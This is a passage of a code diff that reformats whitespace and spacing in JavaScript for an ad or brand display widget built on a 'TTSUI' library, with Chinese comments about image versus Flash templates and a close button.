             TTSUI.extend(bData, {
-               title: encodeURIComponent(data.title)
+                title: encodeURIComponent(data.title)
             });
             //区分 图片还是flash
             /*if (data.image.match(/^.+\.swf$/i)) {
-                TTSUI.tmpl(_this.brandTAswftmpl, bData).appendTo(_this.brandTab);
-            } else {
-            }*/
+             TTSUI.tmpl(_this.brandTAswftmpl, bData).appendTo(_this.brandTab);
+             } else {
+             }*/
             TTSUI.tmpl(_this.brandTAtmpl, bData).appendTo(_this.brandTab);
             /*if (data.media.match(/^.+\.swf$/i)) {
-                TTSUI.tmpl(_this.brandADswftmpl, bData).appendTo(_this.brandTab);
-            } else {*/
+             TTSUI.tmpl(_this.brandADswftmpl, bData).appendTo(_this.brandTab);
+             } else {*/
             TTSUI.tmpl(_this.brandADtmpl, bData).appendTo(_this.brandTab);
             /*}*/
             _this.brandTab.appendTo(_this.brandObj);
             _this.brandObj.css({
-                "left":sidebarX,
-                "top":sidebarY
+                "left": sidebarX,
+                "top": sidebarY
             }).appendTo(mediaBox);
             if (_this.config.closed === 2) {
                 _this.brandClose = TTSUI('<a href="javascript:;" title="关闭" class="brand_close J_close"></a>').appendTo(_this.brandObj);
@@ -2038,7 +2369,7 @@
             }
             _this.eventJhbrand();
         },
-        eventJhbrand:function () {
+        eventJhbrand: function () {
             var _this = this;
             var showBrand = function () {
                 if (_this.config.popDirect === 1) {
